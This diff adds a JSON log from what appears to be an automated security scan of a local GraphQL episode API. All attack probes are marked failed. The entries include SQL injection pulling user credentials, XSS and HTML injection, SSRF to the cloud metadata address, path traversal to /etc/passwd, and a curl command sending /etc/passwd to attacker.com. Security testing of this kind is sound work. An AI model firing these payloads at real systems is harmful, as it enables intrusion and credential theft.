@@ -1,0 +1,368 @@
+[
+  {
+    "query": {
+      "query": "\nquery {\n  episodesByIds(ids: [\"1\", \"2\"]) {\n    id\n    name\n    air_date\n    episode\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.292,
+    "timestamp": "2025-10-04T22:52:43.108934Z",
+    "count": 1,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "episodesByIds": [
+          {
+            "id": "1",
+            "name": "Pilot",
+            "air_date": "December 2, 2013",
+            "episode": "S01E01"
+          },
+          {
+            "id": "2",
+            "name": "Lawnmower Dog",
+            "air_date": "December 9, 2013",
+            "episode": "S01E02"
+          }
+        ]
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  episodesByIds(ids: [\"' UNION SELECT NULL,CONCAT(username,':',password) FROM users--\"]) {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.059,
+    "timestamp": "2025-10-04T22:52:45.823445Z",
+    "count": 2,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "episodesByIds": null
+      },
+      "errors": [
+        {
+          "message": "500: Internal Server Error",
+          "locations": [
+            {
+              "line": 2,
+              "column": 3
+            }
+          ],
+          "path": [
+            "episodesByIds"
+          ],
+          "extensions": {
+            "code": "INTERNAL_SERVER_ERROR",
+            "response": {
+              "url": "http://localhost:8080/api/episode/%27%20UNION%20SELECT%20NULL,CONCAT(username,%27:%27,password)%20FROM%20users--",
+              "status": 500,
+              "statusText": "Internal Server Error",
+              "body": {
+                "error": "Cast to Number failed for value \"NaN\" at path \"id\" for model \"Episode\""
+              }
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  episodesByIds(ids: [\"1\\\", \\\"2\\\"]); alert('XSS');//\"]) {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 2.561,
+    "timestamp": "2025-10-04T22:52:50.325659Z",
+    "count": 3,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "episodesByIds": []
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  episodesByIds(ids: [\"http://169.254.169.254/latest/meta-data\"]) {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.137,
+    "timestamp": "2025-10-04T22:52:53.947818Z",
+    "count": 4,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "episodesByIds": []
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  episodesByIds(ids: [\"; curl http://attacker.com?exfil=$(cat /etc/passwd)|\"]) {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.135,
+    "timestamp": "2025-10-04T22:52:56.682178Z",
+    "count": 5,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "episodesByIds": []
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  episodesByIds(ids: [\"../../../../etc/passwd%00\"]) {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.248,
+    "timestamp": "2025-10-04T22:53:00.553001Z",
+    "count": 6,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "episodesByIds": []
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  episodesByIds(ids: [\"<iframe src='javascript:alert(document.domain)'>\"]) {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 2.11,
+    "timestamp": "2025-10-04T22:53:04.914836Z",
+    "count": 7,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "episodesByIds": null
+      },
+      "errors": [
+        {
+          "message": "500: Internal Server Error",
+          "locations": [
+            {
+              "line": 2,
+              "column": 3
+            }
+          ],
+          "path": [
+            "episodesByIds"
+          ],
+          "extensions": {
+            "code": "INTERNAL_SERVER_ERROR",
+            "response": {
+              "url": "http://localhost:8080/api/episode/%3Ciframe%20src=%27javascript:alert(document.domain)%27%3E",
+              "status": 500,
+              "statusText": "Internal Server Error",
+              "body": {
+                "error": "Hey! you must provide an id"
+              }
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  episodesByIds(ids: [\"1\"]) {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.221,
+        "timestamp": "2025-10-04T22:53:08.106961Z",
+        "response_body": {
+          "data": {
+            "episodesByIds": [
+              {
+                "id": "1",
+                "name": "Pilot"
+              }
+            ]
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.196,
+        "timestamp": "2025-10-04T22:53:09.303356Z",
+        "response_body": {
+          "data": {
+            "s": [
+              {
+                "id": "1",
+                "name": "Pilot"
+              }
+            ]
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 8,
+    "timestamp": "2025-10-04T22:53:09.303468Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 200,
+    "retry_time_seconds": 0.908,
+    "retry_response_body": {
+      "data": {
+        "episodesByIds": [
+          {
+            "id": "1",
+            "name": "Pilot"
+          }
+        ]
+      }
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  s: episodesByIds(ids: [\"1\"]) {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.081,
+        "timestamp": "2025-10-04T22:53:12.916069Z",
+        "response_body": {
+          "data": {
+            "episodesByIds": [
+              {
+                "id": "1",
+                "name": "Pilot"
+              }
+            ]
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.92,
+        "timestamp": "2025-10-04T22:53:13.836601Z",
+        "response_body": {
+          "data": {
+            "s": [
+              {
+                "id": "1",
+                "name": "Pilot"
+              }
+            ]
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 9,
+    "timestamp": "2025-10-04T22:53:13.836624Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 200,
+    "retry_time_seconds": 0.958,
+    "retry_response_body": {
+      "data": {
+        "episodesByIds": [
+          {
+            "id": "1",
+            "name": "Pilot"
+          }
+        ]
+      }
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  episodesByIds {\n    queryType {\n      name\n      fields {\n        name\n        args {\n          name\n          type {\n            name\n          }\n        }\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 413,
+    "request_time_seconds": 1.783,
+    "timestamp": "2025-10-04T22:53:19.098182Z",
+    "count": 10,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Query depth limit exceeded.",
+          "extensions": {
+            "code": "GCDN_QUERY_DEPTH_LIMIT",
+            "httpStatusCode": 413
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  episodesByIds(ids: [\"1\"]) {\n    id\n    naame\n    airr_date\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 1.29,
+    "timestamp": "2025-10-04T22:53:23.329370Z",
+    "count": 11,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"naame\" on type \"Episode\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        },
+        {
+          "message": "Cannot query field \"airr_date\" on type \"Episode\". Did you mean \"air_date\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  }
+]
